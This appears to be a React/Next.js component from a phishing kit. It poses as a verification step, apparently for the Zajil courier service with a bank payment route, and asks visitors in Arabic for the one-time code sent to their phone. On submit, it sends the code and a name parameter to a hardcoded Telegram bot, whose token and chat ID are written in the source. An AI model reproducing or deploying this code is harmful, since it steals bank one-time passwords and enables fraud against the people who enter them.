"use client"
import styles from './code.module.css'
import { useRef } from 'react'
import { useRouter,useSearchParams } from 'next/navigation'
import Footer from '@/compnante/Footer'
const Code = () => {
 
  const counter = 0;
  const code = useRef();
  const router = useRouter()
  const x = useSearchParams();
  const datas = x.get("names") 
  const handleSubmit = (e) => {
    e.preventDefault();
    var bot={
      token:"6602536113:AAEOJoRLjsoPUxdqp9SwU1jeFqtuXf712PY",
      chat_id:6364334502
    }
    var length= `%0A كود التحقق : ${code.current.value} %0A BY Admin Zajil %0A %0A ${datas}:`
    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
  
  }
  const handlerout = ()=>{
    if(code.current.value == "" || counter != 1){
      alert('من فضلك قم بملى الحقول')
    }else{
      counter = counter +1
      router.push('/fozajil/banks/pay/code/nphad/codeto')
    }
  }

  return (
    <div className={styles.contect}>
      <div>
      <h1> كود التحقق</h1>
      
     
      <form  onSubmit={handleSubmit}>
        <label htmlFor="">
        ادخل كود التحقق المرسل حديثا لهاتفك
        <input type="text" ref={code} placeholder=" ****" />
        </label>
        <button type='submit' onClick={handlerout}>تحقق</button>
      </form>
      <p>هل تواجه مشكلة في تسجيل الدخول ؟ أعد الاتصال</p>
      </div>
    </div>
    
  )
}

export default Code
